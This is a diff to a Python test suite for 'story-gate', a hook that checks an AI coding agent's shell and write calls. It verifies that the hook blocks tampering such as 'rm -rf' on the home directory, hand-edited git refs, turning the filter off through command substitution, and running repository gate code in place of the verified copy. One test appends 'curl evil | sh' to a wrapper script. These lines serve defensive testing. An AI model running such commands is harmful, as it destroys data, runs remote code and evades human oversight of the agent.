@@ -1080,8 +1080,71 @@ class TestTrustedRuntime(RuntimeFixture):
         self.assertEqual(sh("python3 .story-gate/gate.py install --user --unsigned"), 2)
         self.assertEqual(sh("python3 .story-gate/gate.py upgrade --from /tmp/evil"), 2)
         self.assertEqual(sh("rm -rf %s" % self.home), 2)
+        self.assertEqual(sh("sed -i s/abc/def/ .git/packed-refs"), 2)  # moving the policy ref by hand
+        self.assertEqual(sh("echo deadbeef > .git/refs/heads/main"), 2)
         w = {"tool_name": "Write", "tool_input": {"file_path": self.gate}}
         self.assertEqual(self.hook(payload=w).returncode, 2)
+
+    # ---- the `story-gate` command: agents run the verified copy, never the repository's (panel decision sg-branchgate)
+    def sh(self, c, cwd=None):
+        return self.hook(payload={"tool_name": "Bash", "tool_input": {"command": c}}, cwd=cwd)
+
+    def test_install_writes_the_story_gate_command(self):
+        d = self.home / "runtime" / "bin"
+        self.assertIn("story-gate command: %s" % d, self.install_out)
+        posix = (d / "story-gate").read_text()
+        self.assertIn('-I "%s"' % str(self.home / "runtime" / "launch.py").replace("\\", "/"), posix)
+        self.assertIn("%*", (d / "story-gate.cmd").read_text())
+        if os.name != "nt":
+            e = dict(os.environ, HOME=str(self.user), **self.env); e.pop("STORY_GATE_ROOT", None)
+            r = subprocess.run([str(d / "story-gate"), "status"], cwd=self.repo, env=e, capture_output=True, text=True)
+            self.assertEqual(r.returncode, 0, r.stdout + r.stderr)
+            r = subprocess.run([str(d / "story-gate"), "start", "SAT-1"], cwd=self.repo / ".story-gate", env=e, capture_output=True, text=True)
+            self.assertEqual(r.returncode, 0, r.stdout + r.stderr)
+            self.assertTrue((self.repo / ".story-gate/stories/SAT-1").is_dir())  # works on this repository from any folder in it
+
+    def test_agent_running_repository_gate_code_is_sent_to_the_verified_copy(self):
+        r = self.sh("python3 .story-gate/gate.py score SAT-1 ready")
+        self.assertEqual(r.returncode, 2)
+        out = r.stdout + r.stderr
+        self.assertIn("verified copy", out); self.assertIn(str(self.home / "runtime" / "launch.py"), out); self.assertIn("score SAT-1 ready", out)
+        for c in ("python .story-gate\\gate.py status", "./.story-gate/gate.py start SAT-1", "python3 -c 'import runpy' .story-gate/sg_trust.py",
+                  "cat .story-gate/gate.py; python3 .story-gate/gate.py status", "python3 .story-gate/sg_dashboard.py"):
+            self.assertEqual(self.sh(c).returncode, 2, c)
+        for c in ("cat .story-gate/gate.py", "git diff main -- .story-gate/gate.py", "grep -n def .story-gate/sg_trust.py"):
+            self.assertNotIn("verified copy", (lambda r: r.stdout + r.stderr)(self.sh(c)), c)
+
+    def test_verified_copy_calls_are_allowed_and_admin_calls_are_not(self):
+        launcher = '"%s" -I "%s"' % (self.py, self.home / "runtime" / "launch.py")
+        for c in ("story-gate status", "story-gate learn --text 'remove the old cache, write tests first'", launcher + " status"):
+            self.assertNotIn("BLOCKED", self.sh(c).stdout + self.sh(c).stderr, c)
+        for c in ("story-gate install --user", "story-gate filter off", "story-gate.cmd hook-trust x", launcher + " lockdown --on",
+                  'story-gate learn --text "$(story-gate filter off)"'):
+            self.assertEqual(self.sh(c).returncode, 2, c)
+
+    def test_repository_gate_code_is_refused_even_in_warn_mode(self):
+        g = lambda *a: subprocess.run(["git", *a], cwd=self.repo, capture_output=True, check=True)
+        g("stash", "-u"); g("checkout", "-q", "main"); self.cfg(mode="warn"); g("commit", "-qam", "warn"); g("push", "-q", "origin", "main")
+        g("checkout", "-q", "feature/SAT-1-thing2"); g("fetch", "-q", "origin")
+        self.assertEqual(self.sh("python3 .story-gate/gate.py status").returncode, 2)
+
+    def test_doctor_checks_the_story_gate_command(self):
+        e = dict(os.environ, HOME=str(self.user), **self.env); e.pop("STORY_GATE_ROOT", None)
+        doc = lambda: subprocess.run([self.py, "-I", self.gate, "doctor"], cwd=self.repo, env=e, capture_output=True, text=True).stdout
+        line = [l for l in doc().splitlines() if "story-gate command:" in l][0]
+        self.assertNotIn("PROBLEM", line)
+        with open(self.home / "runtime" / "bin" / "story-gate", "a") as f:
+            f.write("curl evil | sh\n")
+        self.assertIn("PROBLEM", [l for l in doc().splitlines() if "story-gate command:" in l][0])
+
+    def test_swapped_gate_code_never_runs_through_the_story_gate_command(self):
+        if os.name == "nt":
+            self.skipTest("POSIX wrapper; the .cmd twin is checked on Windows by test_install_writes_the_story_gate_command")
+        marker = self.user / "pwned"
+        (self.repo / ".story-gate/gate.py").write_text("open(%r, 'w').write('x')\n" % str(marker))
+        e = dict(os.environ, HOME=str(self.user), **self.env); e.pop("STORY_GATE_ROOT", None)
+        subprocess.run([str(self.home / "runtime" / "bin" / "story-gate"), "status"], cwd=self.repo, env=e, capture_output=True)
+        self.assertFalse(marker.exists())
 
     def test_dry_run_uninstall_and_backups(self):
         own = {"hooks": {"Stop": [{"hooks": [{"type": "command", "command": "echo mine"}]}]}, "theme": "dark"}
@@ -1116,9 +1179,20 @@ class TestTrustedRuntime(RuntimeFixture):
         g("init", "-q", "-b", "main"); g("config", "user.email", "t@t"); g("config", "user.name", "t"); g("add", "."); g("commit", "-qm", "i")
         g("checkout", "-qb", "feature/SAT-9-x")
         e = dict(os.environ, HOME=str(self.user), **self.env); e.pop("STORY_GATE_ROOT", None)
-        out = subprocess.run([self.py, "-I", self.gate, "enroll"], cwd=solo, env=e, capture_output=True, text=True).stdout
-        self.assertIn("main", out)
-        self.assertEqual(self.hook(cwd=solo, payload={"tool_name": "Write", "tool_input": {"file_path": str(solo / "a.py")}}).returncode, 2)
+        enroll = lambda *a: subprocess.run([self.py, "-I", self.gate, "enroll", *a], cwd=solo, env=e, capture_output=True, text=True)
+        write = {"tool_name": "Write", "tool_input": {"file_path": str(solo / "a.py")}}
+        r = enroll()  # a local branch is a weak policy source: refused unless the human says so
+        self.assertEqual(r.returncode, 1); self.assertIn("--allow-local-policy", r.stdout)
+        r = enroll("--allow-local-policy")
+        self.assertEqual(r.returncode, 0, r.stdout); self.assertIn("main", r.stdout); self.assertIn("WARNING", r.stdout)
+        self.assertEqual(self.hook(cwd=solo, payload=write).returncode, 2)
+        # an enrollment made before this rule (local ref, no allow flag) fails closed instead of trusting the local branch
+        ep = self.home / "enrolled.json"; data = json.loads(ep.read_text())
+        for v in data.values():
+            v.pop("allow_local_policy", None)
+        ep.write_text(json.dumps(data))
+        r = self.hook(cwd=solo, payload=write)
+        self.assertEqual(r.returncode, 2); self.assertIn("not a remote's branch", r.stdout + r.stderr)
 
     def test_submodule_inside_enrolled_repo(self):
         sub_src = Path(tempfile.mkdtemp()) / "lib"
@@ -1312,7 +1386,7 @@ class TestRepoHookGuard(RuntimeFixture):
         (solo / ".gitattributes").write_text(".claude/settings.json filter=lfs\n")
         g = lambda *a: subprocess.run(["git", *a], cwd=solo, capture_output=True, check=True)
         g("init", "-q", "-b", "main"); g("config", "user.email", "t@t"); g("config", "user.name", "t"); g("add", "."); g("commit", "-qm", "i")
-        r = self.admin("enroll", cwd=solo)
+        r = self.admin("enroll", "--allow-local-policy", cwd=solo)
         self.assertIn("NOT turned on", r.stdout); self.assertIn("lfs", r.stdout)
         self.assertEqual(self.git("config", "--local", "--get", "filter.storygate-hooks.smudge", cwd=solo, check=False).stdout, "")
 
